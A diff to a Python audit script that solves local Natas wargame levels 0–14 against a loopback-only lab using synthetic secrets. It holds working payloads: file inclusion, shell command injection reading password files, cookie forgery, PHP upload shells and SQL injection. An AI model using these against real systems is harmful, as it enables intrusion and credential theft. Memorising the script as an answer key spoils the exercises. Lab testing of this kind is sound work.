@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
-"""End-to-end solve audit for Natas levels 7 through 14.
+"""Opt-in end-to-end solve audit for local Natas levels 0 through 14.
 
-Run only against an authorized local CEI Labs target. Synthetic credentials
-are supplied through NATAS_AUDIT_SECRETS as JSON; no production flags belong
-in this script or its output.
+Run only against an authorized local CEI Labs target. Provide an explicit
+loopback target URL and synthetic credentials; this script never contacts a
+public target and is not part of the default CI test suite.
 """
 
+import argparse
 import base64
-import http.cookiejar
+import html
 import json
-import os
 import re
 import sys
 import urllib.error
@@ -18,23 +18,9 @@ import urllib.request
 import uuid
 
 
-HOST = os.environ.get("NATAS_AUDIT_HOST", "127.0.0.1")
-PORT_BASE = int(os.environ.get("NATAS_AUDIT_PORT_BASE", "18000"))
-SECRETS = json.loads(os.environ["NATAS_AUDIT_SECRETS"])
-
-
-def url(level, path="/"):
-    return f"http://{HOST}:{PORT_BASE + level}{path}"
-
-
-def request(level, path="/", data=None, headers=None):
-    password = "natas0" if level == 0 else SECRETS[f"natas{level}"]
-    token = base64.b64encode(f"natas{level}:{password}".encode()).decode()
-    request_headers = {"Authorization": f"Basic {token}"}
-    request_headers.update(headers or {})
-    req = urllib.request.Request(url(level, path), data=data, headers=request_headers)
-    with urllib.request.urlopen(req, timeout=10) as response:
-        return response.read(), response.headers
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, request, fp, code, msg, headers, newurl):
+        return None
 
 
 def require(value, message):
@@ -42,102 +28,149 @@ def require(value, message):
         raise AssertionError(message)
 
 
-def form(level, fields, path="/index.php", headers=None):
-    encoded = urllib.parse.urlencode(fields).encode()
-    body, response_headers = request(
-        level,
-        path,
-        encoded,
-        {"Content-Type": "application/x-www-form-urlencoded", **(headers or {})},
-    )
-    return body, response_headers
+def parse_secrets(value):
+    secrets = json.loads(value)
+    require(isinstance(secrets, dict), "NATAS_AUDIT_SECRETS must be a JSON object")
+    for level in range(1, 35):
+        require(isinstance(secrets.get(f"natas{level}"), str) and secrets[f"natas{level}"], f"missing synthetic secret natas{level}")
+    require(isinstance(secrets.get("natas34final"), str) and secrets["natas34final"], "missing synthetic secret natas34final")
+    return secrets
 
 
-def multipart(level, filename, content):
-    boundary = "----CEIAudit" + uuid.uuid4().hex
-    body = (
-        f"--{boundary}\r\n"
-        'Content-Disposition: form-data; name="submit"\r\n\r\n'
-        "Upload File\r\n"
-        f"--{boundary}\r\n"
-        f'Content-Disposition: form-data; name="uploadedfile"; filename="{filename}"\r\n'
-        "Content-Type: application/octet-stream\r\n\r\n"
-    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
-    return request(
-        level,
-        "/index.php",
-        body,
-        {"Content-Type": f"multipart/form-data; boundary={boundary}"},
-    )
+def local_base_url(value):
+    parsed = urllib.parse.urlparse(value)
+    require(parsed.scheme == "http" and parsed.hostname in {"127.0.0.1", "localhost"}, "--base-url must be an explicit local http URL")
+    require(parsed.port is not None and not parsed.path.rstrip("/"), "--base-url must include only a local host and port")
+    return value.rstrip("/")
+
+
+class NatasAudit:
+    def __init__(self, base_url, secrets):
+        self.base_url = local_base_url(base_url)
+        self.secrets = secrets
+
+    def url(self, level, path="/"):
+        return f"{self.base_url.rsplit(':', 1)[0]}:{urllib.parse.urlparse(self.base_url).port + level}{path}"
+
+    def request(self, level, path="/", data=None, headers=None, password=None, follow_redirects=True):
+        password = self.secrets[f"natas{level}"] if password is None and level else (password or "natas0")
+        token = base64.b64encode(f"natas{level}:{password}".encode()).decode()
+        request_headers = {"Authorization": f"Basic {token}"}
+        request_headers.update(headers or {})
+        req = urllib.request.Request(self.url(level, path), data=data, headers=request_headers)
+        try:
+            opener = urllib.request.build_opener() if follow_redirects else urllib.request.build_opener(NoRedirect)
+            with opener.open(req, timeout=10) as response:
+                return response.status, response.read(), response.headers
+        except urllib.error.HTTPError as error:
+            return error.code, error.read(), error.headers
+
+    def form(self, level, fields, path="/index.php", headers=None):
+        return self.request(level, path, urllib.parse.urlencode(fields).encode(), {"Content-Type": "application/x-www-form-urlencoded", **(headers or {})})
+
+    def multipart(self, level, filename, content):
+        boundary = "----CEIAudit" + uuid.uuid4().hex
+        body = (
+            f"--{boundary}\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload File\r\n"
+            f"--{boundary}\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"{filename}\"\r\n"
+            "Content-Type: application/octet-stream\r\n\r\n"
+        ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
+        return self.request(level, "/index.php", body, {"Content-Type": f"multipart/form-data; boundary={boundary}"})
 
 
 def xor_bytes(data, key):
     return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))
 
 
-def main():
-    # Level 7: rendered HTML source must contain the clue, then LFI reads it.
-    body, _ = request(7)
-    require(b"/etc/natas_webpass/natas8" in body, "Natas 7 HTML source clue missing")
-    body, _ = request(7, "/index.php?page=/etc/natas_webpass/natas8")
-    require(SECRETS["natas8"].encode() in body, "Natas 7 LFI failed")
+def expect(audit, level, expected, message, **kwargs):
+    status, body, headers = audit.request(level, **kwargs)
+    require(status == 200 and expected in body, message)
+    return body, headers
 
-    # Level 8: reverse bin2hex(strrev(base64_encode(secret))).
-    source, _ = request(8, "/?source")
-    require(b"bin2hex" in source and b"base64_encode" in source, "Natas 8 encoding function missing from source")
-    body, _ = request(8)
+
+def main(base_url, secrets):
+    audit = NatasAudit(base_url, secrets)
+    # Every vhost rejects bad credentials, while each recovered secret opens the next level.
+    for level in range(35):
+        status, _, _ = audit.request(level, password="wrong-password")
+        require(status == 401, f"Natas {level} accepts wrong credentials")
+        status, _, _ = audit.request(level, follow_redirects=False)
+        require(status in (200, 302), f"Natas {level} rejects its configured credentials")
+
+    body, _ = expect(audit, 0, secrets["natas1"].encode(), "Natas 0 HTML comment missing")
+    require(b"<!--" in body, "Natas 0 secret is not in an HTML comment")
+    body, _ = expect(audit, 1, secrets["natas2"].encode(), "Natas 1 HTML comment missing")
+    require(b"oncontextmenu" in body and b"<!--" in body, "Natas 1 right-click/comment path missing")
+
+    body, _ = expect(audit, 2, b"files/pixel.png", "Natas 2 image path missing")
+    require(secrets["natas3"].encode() not in body, "Natas 2 exposes secret before directory listing")
+    body, _ = expect(audit, 2, b"users.txt", "Natas 2 directory listing missing", path="/files/")
+    expect(audit, 2, secrets["natas3"].encode(), "Natas 2 users file missing secret", path="/files/users.txt")
+
+    body, _ = expect(audit, 3, b"Disallow: /s3cr3t/", "Natas 3 robots path missing", path="/robots.txt")
+    require(secrets["natas4"].encode() not in body, "Natas 3 robots leaks secret directly")
+    expect(audit, 3, secrets["natas4"].encode(), "Natas 3 robots-discovered secret missing", path="/s3cr3t/users.txt")
+
+    status, body, _ = audit.request(4)
+    require(status == 200 and b"Access disallowed" in body and secrets["natas5"].encode() not in body, "Natas 4 accepts absent referer")
+    expect(audit, 4, secrets["natas5"].encode(), "Natas 4 referer bypass failed", headers={"Referer": audit.url(5)})
+
+    status, body, headers = audit.request(5)
+    require(status == 200 and b"not logged in" in body and "loggedin=0" in headers.get("Set-Cookie", ""), "Natas 5 default cookie path missing")
+    expect(audit, 5, secrets["natas6"].encode(), "Natas 5 cookie bypass failed", headers={"Cookie": "loggedin=1"})
+
+    status, body, _ = audit.form(6, {"secret": "wrong-secret"})
+    require(status == 200 and b"Wrong secret" in body and secrets["natas7"].encode() not in body, "Natas 6 rejects no wrong secret")
+    body, _ = expect(audit, 6, b"includes/secret.inc", "Natas 6 source include path missing", path="/?source")
+    source_text = html.unescape(re.sub(r"<[^>]+>", "", body.decode(errors="replace"))).replace("\xa0", " ")
+    include_match = re.search(r'include\s+"([^"]+)"', source_text)
+    require(include_match, "Natas 6 source does not expose include filename")
+    _, include_body, _ = audit.request(6, "/" + include_match.group(1))
+    secret_match = re.search(rb'\$secret = "([^"]+)"', include_body)
+    require(secret_match, "Natas 6 include does not expose form secret")
+    status, body, _ = audit.form(6, {"secret": secret_match.group(1).decode()})
+    require(status == 200 and secrets["natas7"].encode() in body, "Natas 6 include/form chain failed")
+
+    body, _ = expect(audit, 7, b"/etc/natas_webpass/natas8", "Natas 7 HTML source clue missing")
+    expect(audit, 7, secrets["natas8"].encode(), "Natas 7 LFI failed", path="/index.php?page=/etc/natas_webpass/natas8")
+    body, _ = expect(audit, 8, b"bin2hex", "Natas 8 encoding source missing", path="/?source")
+    status, body, _ = audit.form(8, {"secret": "wrong-secret"})
+    require(status == 200 and secrets["natas9"].encode() not in body, "Natas 8 accepts wrong secret")
+    _, body, _ = audit.request(8)
     match = re.search(rb"Encoded secret:.*?([0-9a-f]{20,})", body, re.DOTALL)
     require(match, "Natas 8 page does not expose encodedSecret")
     form_secret = base64.b64decode(bytes.fromhex(match.group(1).decode())[::-1]).decode()
-    body, _ = form(8, {"secret": form_secret})
-    require(SECRETS["natas9"].encode() in body, "Natas 8 decoding chain failed")
+    status, body, _ = audit.form(8, {"secret": form_secret})
+    require(status == 200 and secrets["natas9"].encode() in body, "Natas 8 decoding chain failed")
 
-    # Levels 9 and 10: command injection and grep argument injection.
-    path = "/index.php?" + urllib.parse.urlencode({"needle": ";cat /etc/natas_webpass/natas10"})
-    body, _ = request(9, path)
-    require(SECRETS["natas10"].encode() in body, "Natas 9 command injection failed")
-    path = "/index.php?" + urllib.parse.urlencode({"needle": ". /etc/natas_webpass/natas11 #"})
-    body, _ = request(10, path)
-    require(SECRETS["natas11"].encode() in body, "Natas 10 grep injection failed")
+    expect(audit, 9, secrets["natas10"].encode(), "Natas 9 command injection failed", path="/index.php?" + urllib.parse.urlencode({"needle": ";cat /etc/natas_webpass/natas10"}))
+    expect(audit, 10, secrets["natas11"].encode(), "Natas 10 grep injection failed", path="/index.php?" + urllib.parse.urlencode({"needle": ". /etc/natas_webpass/natas11 #"}))
 
-    # Level 11: recover repeating XOR key from known default cookie plaintext.
-    body, headers = request(11)
-    cookie = next(
-        morsel.split(";", 1)[0].split("=", 1)[1]
-        for morsel in headers.get_all("Set-Cookie", [])
-        if morsel.startswith("data=")
-    )
-    ciphertext = base64.b64decode(urllib.parse.unquote(cookie))
+    _, _, headers = audit.request(11)
+    cookie = next(morsel.split(";", 1)[0].split("=", 1)[1] for morsel in headers.get_all("Set-Cookie", []) if morsel.startswith("data="))
     known = b'{"showpassword":"no","bgcolor":"#ffffff"}'
-    recovered = bytes(left ^ right for left, right in zip(ciphertext, known))
-    key = recovered[:4]
-    forged_plaintext = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
-    forged = urllib.parse.quote(base64.b64encode(xor_bytes(forged_plaintext, key)).decode())
-    body, _ = request(11, "/", headers={"Cookie": f"data={forged}"})
-    require(SECRETS["natas12"].encode() in body, "Natas 11 XOR cookie forgery failed")
+    key = bytes(left ^ right for left, right in zip(base64.b64decode(urllib.parse.unquote(cookie)), known))[:4]
+    forged = urllib.parse.quote(base64.b64encode(xor_bytes(b'{"showpassword":"yes","bgcolor":"#ffffff"}', key)).decode())
+    expect(audit, 11, secrets["natas12"].encode(), "Natas 11 XOR cookie forgery failed", headers={"Cookie": f"data={forged}"})
 
-    # Levels 12 and 13: executable upload, then magic-byte bypass.
-    shell = b'<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>'
-    body, _ = multipart(12, "audit.php", shell)
+    _, body, _ = audit.multipart(12, "audit.php", b'<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>')
     require(b"uploads/audit.php" in body, "Natas 12 upload failed")
-    body, _ = request(12, "/uploads/audit.php")
-    require(SECRETS["natas13"].encode() in body, "Natas 12 uploaded PHP did not execute")
-
-    shell = b'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>'
-    body, _ = multipart(13, "audit.php", shell)
+    expect(audit, 12, secrets["natas13"].encode(), "Natas 12 uploaded PHP did not execute", path="/uploads/audit.php")
+    _, body, _ = audit.multipart(13, "audit.php", b'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>')
     require(b"uploads/audit.php" in body, "Natas 13 magic-byte upload failed")
-    body, _ = request(13, "/uploads/audit.php")
-    require(SECRETS["natas14"].encode() in body, "Natas 13 uploaded PHP did not execute")
-
-    # Level 14: quote breakout matching the source's double-quoted query.
-    body, _ = form(14, {"username": '" OR "1"="1" -- ', "password": "x"})
-    require(SECRETS["natas14final"].encode() in body, "Natas 14 SQL injection failed")
-    print("NATAS_LEVELS_7_THROUGH_14_OK")
+    expect(audit, 13, secrets["natas14"].encode(), "Natas 13 uploaded PHP did not execute", path="/uploads/audit.php")
+    status, body, _ = audit.form(14, {"username": '" OR "1"="1" -- ', "password": "x"})
+    require(status == 200 and secrets["natas15"].encode() in body, "Natas 14 SQL injection failed")
+    print("NATAS_LEVELS_0_THROUGH_14_OK")
 
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("--base-url", required=True, help="explicit local level-0 URL, such as http://127.0.0.1:18000")
+    parser.add_argument("--secrets", required=True, help="JSON object containing synthetic natas1..natas34 values and natas34final")
+    args = parser.parse_args()
     try:
-        main()
-    except (AssertionError, urllib.error.URLError, KeyError, ValueError) as error:
+        main(args.base_url, parse_secrets(args.secrets))
+    except (AssertionError, urllib.error.URLError, ValueError, KeyError) as error:
         print(f"NATAS_AUDIT_FAILED: {error}", file=sys.stderr)
         raise SystemExit(1)
